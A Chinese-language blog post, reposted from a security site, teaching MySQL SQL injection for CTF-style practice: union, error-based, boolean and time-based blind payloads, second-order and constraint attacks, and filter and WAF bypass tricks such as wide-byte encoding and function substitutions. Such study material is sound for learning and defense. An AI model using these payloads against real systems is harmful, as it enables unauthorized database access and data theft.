@@ -1,0 +1,461 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>SQL注入相关 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/91110244_p0.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>SQL注入相关</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2021-02-17T15:28:36.000Z" id="date"> 2021-02-17</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-12-29T04:50:35.010Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><p>本篇文章转载自：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/205376#h2-0">https://www.anquanke.com/post/id/205376#h2-0</a></p>
+<p>对SQL注入的学习结束后将会对本文进行改编和补充，届时将会重新发布自己编写的版本。</p>
+<p>&#x2F;&#x2F;————————————–&#x2F;&#x2F;</p>
+<p>[toc]</p>
+<p>本文的注入场景为：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/13/YUgLs1.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/13/YUgLs1.png'><img src="https://s1.ax1x.com/2020/05/13/YUgLs1.png" alt="YUgLs1.png"></a></p>
+<h2 id="一、基础注入"><a href="#一、基础注入" class="headerlink" title="一、基础注入"></a>一、基础注入</h2><h3 id="1-联合查询"><a href="#1-联合查询" class="headerlink" title="1.联合查询"></a><strong>1.联合查询</strong></h3><p>即最常见的union注入：</p>
+<p>若前面的查询结果不为空，则返回两次查询的值：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUPKwq.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUPKwq.png'><img src="https://s1.ax1x.com/2020/05/12/YUPKwq.png" alt="YUPKwq.png"></a></p>
+<p>若前面的查询结果为空，则只返回union查询的值：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUPBtK.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUPBtK.png'><img src="https://s1.ax1x.com/2020/05/12/YUPBtK.png" alt="YUPBtK.png"></a></p>
+<p>查完数据库接下来就要查表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select group_concat(table_name) from information_schema.tables where table_schema=database()%23<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUkd7n.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUkd7n.png'><img src="https://s1.ax1x.com/2020/05/12/YUkd7n.png" alt="YUkd7n.png"></a></p>
+<p>接下来是字段名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&#x27;table1&#x27;%23<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUkT1O.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUkT1O.png'><img src="https://s1.ax1x.com/2020/05/12/YUkT1O.png" alt="YUkT1O.png"></a></p>
+<p>得到字段名后查询相应字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select flag from table1%23<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUAiuQ.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUAiuQ.png'><img src="https://s1.ax1x.com/2020/05/12/YUAiuQ.png" alt="YUAiuQ.png"></a></p>
+<p>一个基本的SQL注入过程就结束了。</p>
+<h3 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h3><p>报错注入是利用mysql在出错的时候会引出查询信息的特征，常用的报错手段有如下10种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1.floor()<br><br>select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);<br><br>2.extractvalue()<br><br>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<br><br>3.updatexml()<br><br>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<br><br>4.geometrycollection()<br><br>select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));<br><br>5.multipoint()<br><br>select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));<br><br>6.polygon()<br><br>select * from test where id=1 and polygon((select * from(select * from(select user())a)b));<br><br>7.multipolygon()<br><br>select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));<br><br>8.linestring()<br><br>select * from test where id=1 and linestring((select * from(select * from(select user())a)b));<br><br>9.multilinestring()<br><br>select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));<br><br>10.exp()<br><br>select * from test where id=1 and exp(~(select * from(select user())a));<br></code></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUAHP0.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUAHP0.png'><img src="https://s1.ax1x.com/2020/05/12/YUAHP0.png" alt="YUAHP0.png"></a></p>
+<h3 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h3><p>常见的布尔盲注场景有两种，一是返回值只有True或False的类型，二是Order by盲注。</p>
+<p><strong>返回值只有True或False的类型</strong></p>
+<p>如果查询结果不为空，则返回True（或者是Success之类的），否则返回False</p>
+<p>这种注入比较简单，可以挨个猜测表名、字段名和字段值的字符，通过返回结果判断猜测是否正确</p>
+<p>例：parameter&#x3D;’ or ascii(substr((select database()) ,1,1))&lt;115—+</p>
+<p><strong>Orderby盲注</strong></p>
+<p>order by rand(True)和order by rand(False)的结果排序是不同的，可以根据这个不同来进行盲注：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUV6c8.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUV6c8.png'><img src="https://s1.ax1x.com/2020/05/12/YUV6c8.png" alt="YUV6c8.png"></a></p>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">order by rand(database()=&#x27;pdotest&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUVhAs.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUVhAs.png'><img src="https://s1.ax1x.com/2020/05/12/YUVhAs.png" alt="YUVhAs.png"></a></p>
+<p>返回了True的排序，说明database()&#x3D;’pdotest’是正确的值</p>
+<h3 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4.时间盲注"></a>4.时间盲注</h3><p>其实大多数页面，即使存在sql注入也基本是不会有回显的，因此这时候就要用延时来判断查询的结果是否正确。</p>
+<p>常见的时间盲注有5种：</p>
+<p><strong>1.sleep(x)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=&#x27; or sleep(3)%23<br><br>id=&#x27; or if(ascii(substr(database(),1,1))&gt;114,sleep(3),0)%23<br></code></pre></td></tr></table></figure>
+
+<p>查询结果正确，则延迟3秒，错误则无延时。</p>
+<p><strong>2.benchmark()</strong></p>
+<p>通过大量运算来模拟延时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=&#x27; or benchmark(10000000,sha(1))%23<br><br>id=&#x27; or if(ascii(substr(database(),1,1))&gt;114,benchmark(10000000,sha(1)),0)%23<br></code></pre></td></tr></table></figure>
+
+<p>本地测试这个值大约可延时3秒：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUZcP1.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUZcP1.png'><img src="https://s1.ax1x.com/2020/05/12/YUZcP1.png" alt="YUZcP1.png"></a></p>
+<p><strong>3.笛卡尔积</strong></p>
+<p>计算笛卡尔积也是通过大量运算模拟延时：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C<br><br>select balabala from table1 where &#x27;1&#x27;=&#x27;2&#x27; or if(ascii(substr(database(),1,1))&gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)<br></code></pre></td></tr></table></figure>
+
+<p>笛卡尔积延时大约也是3秒</p>
+<p><strong>4.get_lock</strong></p>
+<p>属于比较鸡肋的一种时间盲注，需要两个session，在第一个session中加锁：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select get_lock(&#x27;test&#x27;,1)<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUebTJ.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUebTJ.png'><img src="https://s1.ax1x.com/2020/05/12/YUebTJ.png" alt="YUebTJ.png"></a></p>
+<p>然后再第二个session中执行查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select get_lock(&#x27;test&#x27;,5)<br></code></pre></td></tr></table></figure>
+
+<p>另一个窗口：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YUexl6.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUexl6.png'><img src="https://s1.ax1x.com/2020/05/12/YUexl6.png" alt="YUexl6.png"></a></p>
+<p><strong>5.rlike+rpad</strong></p>
+<p>rpad(1,3,’a’)是指用a填充第一位的字符串以达到第二位的长度<br>经本地测试mysql5.7最大允许用单个rpad()填充349525位，而多个rpad()可以填充4个349525位，<br>因此可用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where 1=1 and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd&#x27;,1);<br></code></pre></td></tr></table></figure>
+
+<p>以上所写是本地测试的最大填充长度，延时0.3秒，最后的asdasdasd对时间长度有巨大影响，可以增长其长度以增大时延<br>这个长度大概是1秒：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where 1=1 and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd&#x27;,1);<br></code></pre></td></tr></table></figure>
+
+<p>这个长度大概是2秒：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from table1 where 1=1 and if(mid(user(),1,1)=&#x27;r&#x27;,concat(rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd&#x27;,1);<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-HTTP头注入"><a href="#5-HTTP头注入" class="headerlink" title="5.HTTP头注入"></a>5.HTTP头注入</h3><p>用于在cookie或referer中存储数据的场景，通常伴随着base64加密或md5等摘要算法，注入方式与上述相同。</p>
+<h3 id="6-HTTP分割注入"><a href="#6-HTTP分割注入" class="headerlink" title="6.HTTP分割注入"></a>6.HTTP分割注入</h3><p>如果存在一个登录场景，参数为username&amp;password</p>
+<p>查询语句为select xxx from xxx where username&#x3D;’xxx’ and password&#x3D;’xxx’</p>
+<p>但是username参数过滤了注释符，无法将后面的注释掉，则可尝试用<strong>内联注释</strong>把password注释掉，凑成一条新语句后注释或闭合掉后面的语句：</p>
+<p>例如实验吧加了料的报错注入：</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/dm/1024_104_/t012f242a6b29cf0131.png" class='item-img' data-src='https://p0.ssl.qhimg.com/dm/1024_104_/t012f242a6b29cf0131.png'><img src="https://p0.ssl.qhimg.com/dm/1024_104_/t012f242a6b29cf0131.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t013a39d4247334604f.png" class='item-img' data-src='https://p1.ssl.qhimg.com/t013a39d4247334604f.png'><img src="https://p1.ssl.qhimg.com/t013a39d4247334604f.png"></a></p>
+<p>（来源：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/s1ye/p/8284806.html%EF%BC%89">https://www.cnblogs.com/s1ye/p/8284806.html）</a></p>
+<p>这样就凑成了如下的语句,将password参数直接注释掉：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from users where username=&#x27;1&#x27; or extractvalue/*&#x27;and password=&#x27;1*/(1,concat(0x7e,(select database()),0x7e))) or &#x27;&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>当然这种注入的前提是<strong>单引号没有被过滤</strong>。如果过滤不太多的话，其实也有很多其他的方式如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST username=1&#x27; or if(ascii(substr(database(),1,1))=115,sleep(3),0) or &#x27;1&amp;password=1<br>凑成：<br>select * from users where username=&#x27;1&#x27; or if(ascii(substr(database(),1,1))&gt;0,sleep(3),0) or &#x27;1&#x27; and password=&#x27;1&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>还有一个例子是GYCTF中的一道sql注入题，通过注入来登录：</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/YUMyIe" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YUMyIe.png'><img src="https://s1.ax1x.com/2020/05/12/YUMyIe.png" alt="YUMyIe.png"></a></p>
+<p>过滤了空格,union,#,—+,&#x2F;*,^,or,</p>
+<p>这样上面用类似or ‘1’&#x3D;’1’万能钥匙的方式来注入就不太可能了。</p>
+<p>可以考虑<strong>将password作为函数的参数</strong>来闭合语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=admin&#x27;and(strcmp(&amp;password=,&#x27;asdasdasdasdasdasd&#x27;))and&#x27;1<br>这样凑成：<br>select username from users where username=&#x27;admin&#x27;and(strcmp(&#x27;and password=&#x27;,&#x27;asdasdasdasdasdasd&#x27;))and&#x27;1&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>strcmp比较，二者不一致返回True，一致返回False，而MySQL会将’1’判断为数字1，即True，因此该查询语句结果为True</p>
+<h3 id="7-二次注入"><a href="#7-二次注入" class="headerlink" title="7.二次注入"></a>7.二次注入</h3><p>二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题</p>
+<p>假如登录&#x2F;注册处的SQL语句没有可以注入的地方，并将username储存在session中，而在登录之后页面查询语句没有过滤，为：</p>
+<p>select * from users where username&#x3D;’$_SESSION[‘username’]’</p>
+<p>则我们在注册的时候便可将注入语句写入到session中，在登录后再查询的时候则会执行SQL语句：</p>
+<p>如username&#x3D;admin’#，登录后查询语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from users where username=&#x27;admin&#x27; #&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>就构成了SQL注入。</p>
+<h3 id="8-SQL约束攻击"><a href="#8-SQL约束攻击" class="headerlink" title="8.SQL约束攻击"></a>8.SQL约束攻击</h3><p>假如注册时username参数在mysql中为<strong>字符串</strong>类型，并且有<strong>unique属性</strong>，设置了长度为VARCHAR(20)。</p>
+<p>则我们注册一个username为admin[20个空格]asd的用户名，则在mysql中首先会判断是否有重复，若无重复，则会<strong>截取前20个字符</strong>加入到数据库中，所以数据库存储的数据为admin[20个空格]，而进行登录的时候，SQL语句会<strong>忽略空格</strong>，因此我们相当于覆写了admin账号。</p>
+<h2 id="二、基础绕过"><a href="#二、基础绕过" class="headerlink" title="二、基础绕过"></a>二、基础绕过</h2><h3 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h3><p>用于过滤时没有匹配大小写的情况：</p>
+<p>SelECt * from table;</p>
+<h3 id="2-双写绕过"><a href="#2-双写绕过" class="headerlink" title="2.双写绕过"></a>2.双写绕过</h3><p>用于将禁止的字符直接删掉的过滤情况如：</p>
+<p>preg_replace(‘&#x2F;select&#x2F;‘,’’,input)</p>
+<p>则可用seselectlect <em>from xxx来绕过，在删除一个select后剩下的就是select</em> from xxx</p>
+<h3 id="3-添加注释"><a href="#3-添加注释" class="headerlink" title="3.添加注释"></a>3.添加注释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/*! */类型的注释，内部的语句会被执行<br></code></pre></td></tr></table></figure>
+
+<p>本地mysql5.7测试通过：</p>
+<p><a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/12/YU1JIS.png" class='item-img' data-src='https://s1.ax1x.com/2020/05/12/YU1JIS.png'><img src="https://s1.ax1x.com/2020/05/12/YU1JIS.png" alt="YU1JIS.png"></a></p>
+<p>可以用来绕过一些WAF，或者绕过<strong>空格</strong></p>
+<p>但是，不能将关键词用注释分开，例如下面的语句是不可以执行的（或者说只能在某些较老的版本执行）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select bbb from table1 where balabala=&#x27;&#x27; union se/*!lect database()*/;<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-使用16进制绕过特定字符"><a href="#4-使用16进制绕过特定字符" class="headerlink" title="4.使用16进制绕过特定字符"></a><strong>4.使用16进制绕过特定字符</strong></h3><p>如果在查询字段名的时候表名被过滤，或是数据库中某些特定字符被过滤，则可用16进制绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select column_name from information_schema.columns where table_name=0x7573657273;<br></code></pre></td></tr></table></figure>
+
+<p>0x7573657273为users的16进制</p>
+<h3 id="5-宽字节、Latin1默认编码"><a href="#5-宽字节、Latin1默认编码" class="headerlink" title="5.宽字节、Latin1默认编码"></a>5.宽字节、Latin1默认编码</h3><p><strong>宽字节注入</strong></p>
+<p>用于<strong>单引号被转义</strong>，但编码为<strong>gbk编码</strong>的情况下，用特殊字符将其与反斜杠合并，构成一个特殊字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username = %df&#x27;#<br>经gbk解码后变为：<br>select * from users where username =&#x27;運&#x27;#<br></code></pre></td></tr></table></figure>
+
+<p>成功闭合了单引号。</p>
+<p><strong>Latin1编码</strong></p>
+<p>Mysql表的编码默认为latin1，如果设置字符集为utf8，则存在一些latin1中有而utf8中没有的字符，而Mysql是如何处理这些字符的呢？<strong>直接忽略</strong></p>
+<p>于是我们可以输入?username&#x3D;admin%c2，存储至表中就变为了admin</p>
+<p>上面的%c2可以换为%c2-%ef之间的任意字符</p>
+<h3 id="6-各个字符以及函数的代替"><a href="#6-各个字符以及函数的代替" class="headerlink" title="6.各个字符以及函数的代替"></a>6.各个字符以及函数的代替</h3><p><strong>数字的代替：</strong></p>
+<p>摘自<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html">MySQL注入技巧</a></p>
+<p>代替字符</p>
+<p>数</p>
+<p>代替字符</p>
+<p>代替的数</p>
+<p>数、字</p>
+<p>代替的数</p>
+<p>false、!pi()</p>
+<p>0</p>
+<p>ceil(pi()*pi())</p>
+<p>A</p>
+<p>ceil((pi()+pi())*pi())</p>
+<p>K</p>
+<p>true、!(!pi())</p>
+<p>1</p>
+<p>ceil(pi()*pi())+true</p>
+<p>B</p>
+<p>ceil(ceil(pi())*version())</p>
+<p>L</p>
+<p>true+true</p>
+<p>2</p>
+<p>ceil(pi()+pi()+version())</p>
+<p>C</p>
+<p>ceil(pi()*ceil(pi()+pi()))</p>
+<p>M</p>
+<p>floor(pi())、~~pi()</p>
+<p>3</p>
+<p>floor(pi()*pi()+pi())</p>
+<p>D</p>
+<p>ceil((pi()+ceil(pi()))*pi())</p>
+<p>N</p>
+<p>ceil(pi())</p>
+<p>4</p>
+<p>ceil(pi()*pi()+pi())</p>
+<p>E</p>
+<p>ceil(pi())*ceil(version())</p>
+<p>O</p>
+<p>floor(version()) &#x2F;&#x2F;注意版本</p>
+<p>5</p>
+<p>ceil(pi()*pi()+version())</p>
+<p>F</p>
+<p>floor(pi()*(version()+pi()))</p>
+<p>P</p>
+<p>ceil(version())</p>
+<p>6</p>
+<p>floor(pi()*version())</p>
+<p>G</p>
+<p>floor(version()*version())</p>
+<p>Q</p>
+<p>ceil(pi()+pi())</p>
+<p>7</p>
+<p>ceil(pi()*version())</p>
+<p>H</p>
+<p>ceil(version()*version())</p>
+<p>R</p>
+<p>floor(version()+pi())</p>
+<p>8</p>
+<p>ceil(pi()*version())+true</p>
+<p>I</p>
+<p>ceil(pi()_pi()_pi()-pi())</p>
+<p>S</p>
+<p>floor(pi()*pi())</p>
+<p>9</p>
+<p>floor((pi()+pi())*pi())</p>
+<p>J</p>
+<p>floor(pi()_pi()_floor(pi()))</p>
+<p>T</p>
+<p>其中!(!pi())代替1本地测试没有成功，还不知道原因。</p>
+<p><strong>常用字符的替代</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">and -&gt; &amp;&amp;<br>or -&gt; <br>空格-&gt; /**/ -&gt; %a0 -&gt; %0a -&gt; +<br># -&gt; --+ -&gt; ;%00(php&lt;=5.3.4) -&gt; or &#x27;1&#x27;=&#x27;1<br>= -&gt; like -&gt; regexp -&gt; &lt;&gt; -&gt; in<br>注：regexp为正则匹配，利用正则会有些新的注入手段<br></code></pre></td></tr></table></figure>
+
+<p><strong>常用函数的替代</strong></p>
+<p>字符串截取&#x2F;拼接函数：</p>
+<p>摘自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169">https://xz.aliyun.com/t/7169</a></p>
+<p>函数</p>
+<p>说明</p>
+<p>SUBSTR(str,N_start,N_length)</p>
+<p>对指定字符串进行截取，为SUBSTRING的简单版。</p>
+<p>SUBSTRING()</p>
+<p>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</p>
+<p>RIGHT(str,len)</p>
+<p>对指定字符串从<strong>最右边</strong>截取指定长度。</p>
+<p>LEFT(str,len)</p>
+<p>对指定字符串从<strong>最左边</strong>截取指定长度。</p>
+<p>RPAD(str,len,padstr)</p>
+<p>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</p>
+<p>LPAD(str,len,padstr)</p>
+<p>与RPAD相似，在<code>str</code>左边补齐。</p>
+<p>MID(str,pos,len)</p>
+<p>同于 <code>SUBSTRING(str,pos,len)</code>。</p>
+<p>INSERT(str,pos,len,newstr)</p>
+<p>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</p>
